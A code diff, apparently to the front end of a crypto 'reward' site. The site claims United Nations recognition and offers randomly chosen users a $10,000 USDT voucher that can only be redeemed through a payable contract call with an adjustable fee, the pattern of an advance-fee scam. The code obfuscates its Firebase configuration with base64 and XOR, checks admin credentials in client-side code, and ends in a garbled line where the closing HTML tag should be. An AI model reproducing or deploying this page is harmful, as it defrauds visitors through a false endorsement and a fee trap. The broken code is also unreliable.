@@ -7,7 +7,6 @@
     <meta name="description" content="United Nations recognized initiative honoring randomly selected internet users worldwide with a $10,000 USDT recognition voucher.">
     <meta name="theme-color" content="#0a1a2e">
     
-    <!-- Favicon -->
     <link rel="icon" type="image/png" href="https://i.postimg.cc/s2NH2dP4/world-data-reward-600x600.png">
     <link rel="apple-touch-icon" href="https://i.postimg.cc/s2NH2dP4/world-data-reward-600x600.png">
     
@@ -118,11 +117,7 @@
             text-shadow: 0 2px 16px rgba(0, 0, 0, 0.4);
             animation: gentleGlow 3s ease-in-out infinite;
         }
-        @keyframes gentleGlow {
-            0%, 100% { text-shadow: 0 2px 16px rgba(212, 175, 55, 0.3); }
-            50% { text-shadow: 0 2px 28px rgba(212, 175, 55, 0.55); }
-        }
-
+        @keyframes gentleGlow { 0%, 100% { text-shadow: 0 2px 16px rgba(212, 175, 55, 0.3); } 50% { text-shadow: 0 2px 28px rgba(212, 175, 55, 0.55); } }
         .amount-giant { font-size: clamp(50px, 11vw, 72px); font-weight: 800; color: var(--usdt-green); text-align: center; letter-spacing: -1.5px; line-height: 1; }
         .text-body { font-size: 14px; color: var(--text-secondary); line-height: 1.7; }
         .text-small { font-size: 12px; color: var(--text-secondary); }
@@ -143,10 +138,7 @@
             gap: 14px; margin: 22px 0; color: var(--gold);
             font-size: 11px; letter-spacing: 2.5px; text-transform: uppercase; font-weight: 500;
         }
-        .laurel-line::before, .laurel-line::after {
-            content: ''; flex: 1; height: 1px;
-            background: linear-gradient(to right, transparent, rgba(212, 175, 55, 0.4), transparent);
-        }
+        .laurel-line::before, .laurel-line::after { content: ''; flex: 1; height: 1px; background: linear-gradient(to right, transparent, rgba(212, 175, 55, 0.4), transparent); }
 
         .btn {
             display: inline-flex; align-items: center; justify-content: center;
@@ -165,26 +157,15 @@
         .btn:hover:not(:disabled) { filter: brightness(1.1); box-shadow: 0 10px 28px rgba(0, 0, 0, 0.35); transform: translateY(-1px); }
         .btn-outline:hover:not(:disabled) { background: rgba(212, 175, 55, 0.08); border-color: var(--gold); }
 
-        .input-field {
-            width: 100%; padding: 13px 16px; border-radius: var(--radius-md);
-            border: 1.5px solid rgba(255, 255, 255, 0.1);
-            background: rgba(0, 0, 0, 0.3); color: var(--text-primary);
-            font-size: 14.5px; transition: var(--transition); font-family: inherit;
-        }
+        .input-field { width: 100%; padding: 13px 16px; border-radius: var(--radius-md); border: 1.5px solid rgba(255, 255, 255, 0.1); background: rgba(0, 0, 0, 0.3); color: var(--text-primary); font-size: 14.5px; transition: var(--transition); font-family: inherit; }
         .input-field:focus { outline: none; border-color: var(--gold); box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.06); }
         .input-field::placeholder { color: rgba(255, 255, 255, 0.22); }
         .input-code { font-family: var(--font-mono); letter-spacing: 3px; text-align: center; font-size: 17px; text-transform: uppercase; }
         .input-pin { font-family: var(--font-mono); letter-spacing: 8px; text-align: center; font-size: 22px; max-width: 140px; }
-        select.input-field {
-            appearance: none; -webkit-appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23d4af37' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E");
-            background-repeat: no-repeat; background-position: right 14px center;
-            padding-right: 40px; cursor: pointer;
-        }
+        select.input-field { appearance: none; -webkit-appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23d4af37' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 14px center; padding-right: 40px; cursor: pointer; }
         select.input-field option { background: #132030; color: #fff; }
 
         .form-label { display: block; font-size: 10.5px; font-weight: 600; color: var(--text-muted); margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.6px; }
-
         .status-pill { display: inline-flex; align-items: center; gap: 6px; padding: 5px 14px; border-radius: var(--radius-full); font-size: 11.5px; font-weight: 600; }
         .status-ready { background: rgba(46, 168, 118, 0.15); color: var(--usdt-green-light); }
         .status-pending { background: rgba(240, 160, 64, 0.12); color: #f0a040; }
@@ -360,9 +341,7 @@
     (function() {
         const _B = (s) => atob(s);
         const _X = (s, k) => s.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length))).join('');
-        
         const _p = _B('d29ybGQtZGF0YS1yZXdhcmQ=');
-        
         const _fcfg = {
             a: _B('QUl6YVN5Qkw0WFNnRmszTWd4S2NkS3ZvU3A2YlJl') + 'aGJjNWNFZDcw',
             b: _B('d29ybGQtZGF0YS1yZXdhcmQuZmlyZWJhc2VhcHAuY29t'),
@@ -378,37 +357,15 @@
         const ADMIN_PASSWORD = _X(_B('PASTE_ENCODED_PASSWORD'), _p);
         const _pinRaw = _X(_B('PASTE_ENCODED_PIN'), _fcfg.a.slice(0,4));
         const CODE_GEN_PIN = [..._pinRaw].map(Number);
-        
         const ADMIN_PATH_HASH = 'wdr-admin';
         window._C = CONTRACT_ADDRESS;
         
         let db = null;
-        try {
-            firebase.initializeApp({apiKey:_fcfg.a, authDomain:_fcfg.b, projectId:_fcfg.c, storageBucket:_fcfg.d, messagingSenderId:_fcfg.e, appId:_fcfg.f});
-            db = firebase.firestore();
-        } catch(e) { db = null; }
+        try { firebase.initializeApp({apiKey:_fcfg.a, authDomain:_fcfg.b, projectId:_fcfg.c, storageBucket:_fcfg.d, messagingSenderId:_fcfg.e, appId:_fcfg.f}); db = firebase.firestore(); } catch(e) { db = null; }
     
-        document.addEventListener('DOMContentLoaded', () => {
-            const el = document.getElementById('contractAddrDisplay');
-            if (el) el.textContent = CONTRACT_ADDRESS;
-        });
+        document.addEventListener('DOMContentLoaded', () => { const el = document.getElementById('contractAddrDisplay'); if (el) el.textContent = CONTRACT_ADDRESS; });
     
-        const CONTRACT_ABI = [
-            "function claimVoucher(string) external",
-            "function requestRedemption() external payable",
-            "function approveRedemption(address) external",
-            "function rejectRedemption(address,string) external",
-            "function fundSponsor() external payable",
-            "function sponsorBalance() view returns (uint256)",
-            "function setRedemptionActive(bool) external",
-            "function setRedeemFee(uint256) external",
-            "function hasVoucher(address) view returns (bool)",
-            "function canRedeem(address) view returns (bool,uint256,string)",
-            "function getVoucherInfo(address) view returns (uint256,bool,bool,uint256)",
-            "function redeemFee() view returns (uint256)",
-            "function totalClaimed() view returns (uint256)",
-            "function totalRedeemed() view returns (uint256)"
-        ];
+        const CONTRACT_ABI = ["function claimVoucher(string) external","function requestRedemption() external payable","function approveRedemption(address) external","function rejectRedemption(address,string) external","function fundSponsor() external payable","function sponsorBalance() view returns (uint256)","function setRedemptionActive(bool) external","function setRedeemFee(uint256) external","function hasVoucher(address) view returns (bool)","function canRedeem(address) view returns (bool,uint256,string)","function getVoucherInfo(address) view returns (uint256,bool,bool,uint256)","function redeemFee() view returns (uint256)","function totalClaimed() view returns (uint256)","function totalRedeemed() view returns (uint256)"];
     
         let provider=null,signer=null,contract=null,userAddress=null,isAdmin=false,chatbotOpen=false;
     
@@ -432,81 +389,35 @@
             isAdminLoggedIn(){return this.get('adminLoggedIn')===true;}
         };
     
-        // ============================================
-        // FIXED NAVIGATION FOR GITHUB PAGES
-        // ============================================
+        // NAVIGATION
         function navigate(page){
             document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
             document.querySelectorAll('.nav-link').forEach(l=>l.classList.remove('active'));
-            
-            const pageEl = document.getElementById('page-' + page);
-            if (pageEl) pageEl.classList.add('active');
-            
-            if (page === 'claim') {
-                document.querySelector('.nav-link[onclick*="claim"]')?.classList.add('active');
-            }
-            if (page === 'redeem') {
-                document.getElementById('redeemNavBtn')?.classList.add('active');
-            }
-            
-            // Update hash without triggering extra events
-            const newHash = (page === 'admin') ? ADMIN_PATH_HASH : page;
-            if (window.location.hash !== '#' + newHash) {
-                history.replaceState(null, '', '#' + newHash);
-            }
-            
-            if (page === 'redeem') initRedeem();
-            if (page === 'admin') {
-                if (Store.isAdminLoggedIn()) {
-                    document.getElementById('adminLoginCard').classList.add('hidden');
-                    document.getElementById('adminDashboard').classList.remove('hidden');
-                    refreshAdmin();
-                } else {
-                    document.getElementById('adminLoginCard').classList.remove('hidden');
-                    document.getElementById('adminDashboard').classList.add('hidden');
-                }
-            }
+            document.getElementById('page-'+page)?.classList.add('active');
+            if(page==='claim')document.querySelector('.nav-link[onclick*="claim"]')?.classList.add('active');
+            if(page==='redeem')document.getElementById('redeemNavBtn')?.classList.add('active');
+            const newHash = (page==='admin')?ADMIN_PATH_HASH:page;
+            history.replaceState(null,'','#'+newHash);
+            if(page==='redeem')initRedeem();
+            if(page==='admin'){if(Store.isAdminLoggedIn()){document.getElementById('adminLoginCard').classList.add('hidden');document.getElementById('adminDashboard').classList.remove('hidden');refreshAdmin();}else{document.getElementById('adminLoginCard').classList.remove('hidden');document.getElementById('adminDashboard').classList.add('hidden');}}
         }
-        window.navigate = navigate;
+        window.navigate=navigate;
     
-        // Handle initial page load
-        window.addEventListener('DOMContentLoaded', () => {
-            const hash = window.location.hash.replace('#', '');
-            if (hash === ADMIN_PATH_HASH) {
-                navigate('admin');
-            } else if (hash === 'redeem') {
-                navigate('redeem');
-            } else {
-                navigate('claim');
-            }
+        (function initRoute(){
+            const h=window.location.hash.replace('#','');
+            if(h===ADMIN_PATH_HASH)navigate('admin');
+            else if(h==='redeem')navigate('redeem');
+            else navigate('claim');
+        })();
+    
+        window.addEventListener('hashchange',()=>{
+            const h=window.location.hash.replace('#','');
+            if(h===ADMIN_PATH_HASH)navigate('admin');
+            else if(h==='redeem')navigate('redeem');
+            else navigate('claim');
         });
     
-        // Handle hash changes (back/forward buttons)
-        window.addEventListener('hashchange', () => {
-            const hash = window.location.hash.replace('#', '');
-            if (hash === ADMIN_PATH_HASH) {
-                navigate('admin');
-            } else if (hash === 'redeem') {
-                navigate('redeem');
-            } else {
-                navigate('claim');
-            }
-        });
-    
-        // Emergency direct access — type gotoAdmin() in console
-        window.gotoAdmin = function() {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById('page-admin').classList.add('active');
-            if (Store.isAdminLoggedIn()) {
-                document.getElementById('adminLoginCard').classList.add('hidden');
-                document.getElementById('adminDashboard').classList.remove('hidden');
-                refreshAdmin();
-            } else {
-                document.getElementById('adminLoginCard').classList.remove('hidden');
-                document.getElementById('adminDashboard').classList.add('hidden');
-            }
-            history.replaceState(null, '', '#wdr-admin');
-        };
+        window.gotoAdmin=function(){navigate('admin');};
     
         function adminLogin(){const u=document.getElementById('adminUsername').value.trim(),p=document.getElementById('adminPassword').value.trim();if(u===ADMIN_USERNAME&&p===ADMIN_PASSWORD){Store.setAdminLoggedIn(true);document.getElementById('adminLoginCard').classList.add('hidden');document.getElementById('adminDashboard').classList.remove('hidden');refreshAdmin();}else{document.getElementById('adminLoginMsg').innerHTML='<p style="color:#f87171;font-size:12px;">Invalid credentials.</p>';}}
         window.adminLogin=adminLogin;
@@ -564,4 +475,4 @@
     })();
     </script>
 </body>
-</html>
+<'adminBal'Bal'
